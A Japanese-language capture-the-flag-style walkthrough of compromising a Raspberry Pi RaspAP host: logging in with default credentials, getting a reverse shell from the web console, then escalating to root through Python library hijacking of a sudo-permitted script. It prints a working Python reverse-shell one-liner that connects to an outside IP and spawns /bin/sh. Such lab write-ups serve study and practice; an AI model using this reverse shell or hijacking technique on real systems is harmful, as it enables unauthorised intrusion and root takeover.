- Rasperry PiのアクセスポイントRaspAPのConsoleからシェルを獲得し、*Python Library Hijacking* の手法で権限昇格する

1. Port Scanで以下HTTPサービスが動作していることを確認
```
8091/tcp  open   http          lighttpd 1.4.53
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: lighttpd/1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
```
- ちなみに３つのSSHサービスが稼働していたが、すべて同じバージョンで特に意味はなかった

2. RaspAPのデフォルト認証情報（admin:secret）でログイン

3. RaspAPの"console"機能から、www-dataのリバースシェルを獲得

4. www-dataのsudo権限を確認したところ、/home/walterのPythonスクリプトをroot権限で実行できることを確認
```sh
$ sudo -l
User ww-data may run the following commands on walla:
 (ALL) NOPASSWD: /sbin/ifup 
 (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py 
 ...
```
- ⚠️NOPASSWDとあるコマンドのとおりでないと、パスワードを要求される（例えばpython wifi_reset.pyとしてもパスワードを要求される）

5. コードの中身は以下の通りだが、`wificontroller`というLibraryは存在しなかった
```python
#!/usr/bin/python
import sys

try:
	import wificontroller
except Exception:
	print "[!] ERROR: Unable to load wificontroller module"
	sys.exit
	
wificontroller.stop("wlan0", "1")
wificontroller.reset("wlan0", "1")
wificontroller.start("wlan0", "1")
```

6. 以下の記事を参考に、Python Library Hijackingの手法で権限昇格できるかもしれないと考える
	- [Linux Privilege Escalation: Python Library Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)
	- [Python Library Hijacking on Linux (with examples)](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

7. Python Libraryの読み込み順を確認する
```sh
$ python -c 'import sys; print "\n".join(sys.path)'
　　　　　　
/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages
```
- 最初の行の空文字は、実行中スクリプトがあるディレクトリ（ここでは`/home/walter`を指す）

8. `/home/walter/wifi_reset.py `と同じディレクトリが一番最初に読み込まれるので、同じディレクトリに`wificontroller.py`というLibarryを配置
```python
import socket,subprocess,os; s=socket.socket(); s.connect(("192.168.45.175",80)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])
```

9. sudoで実行して権限昇格
```sh
sudo /usr/bin/python /home/walter/wifi_reset.py
```
